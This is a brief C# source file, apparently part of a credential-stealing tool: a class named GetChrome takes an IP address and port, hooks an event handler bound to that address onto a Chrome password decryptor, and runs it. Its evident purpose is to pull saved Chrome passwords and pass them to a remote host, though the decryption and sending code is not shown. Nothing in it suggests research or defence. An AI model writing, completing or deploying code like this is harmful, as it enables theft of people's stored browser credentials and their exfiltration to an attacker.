using PS03.PasswordOps.ChromeDecrypt;

namespace PS03.PasswordOps
{
    public class GetChrome
    {
        private int _port;
        private string _ip;

        public GetChrome(string ip, int port)
        {
            this._ip = ip;
            this._port = port;
        }
        public void Execute()
        {
            var ev = new Eventhandlers(_ip, _port);
            CDC.OnPasswordReady += ev.HandleChromeDataReady;
            CDC.Execute();
        }
    }

}